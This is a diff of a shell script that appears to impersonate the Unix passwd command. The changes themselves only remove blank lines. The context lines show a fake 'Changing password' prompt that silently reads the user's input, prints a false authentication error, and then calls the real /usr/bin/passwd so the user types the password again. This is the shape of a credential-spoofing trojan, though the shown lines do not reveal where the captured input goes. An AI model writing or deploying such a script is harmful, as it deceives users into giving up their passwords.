@@ -3,10 +3,7 @@
 DUSER=$USER
 PUSER=$1
 
-
-
 #Function for if no user is specified, passes current user
-
 nouser ()
 {
 	printf "Changing password for user $DUSER.\n"
@@ -17,9 +14,7 @@ nouser ()
 	read -s garbage
 	printf "\npasswd: error - authentication tokens not updated. please try again.\n\n"
 	/usr/bin/passwd $DUSER
-
 }
-
 #Function for if user is specified, passes input
 withuser ()
 {
@@ -31,9 +26,7 @@ withuser ()
 	read -s garbage
 	printf "\npasswd: error - authentication tokens not updated. please try again.\n\n"
 	/usr/bin/passwd $PUSER
-
 }
-
 
 #Check to see if user was passed
 if [ -z $PUSER ]
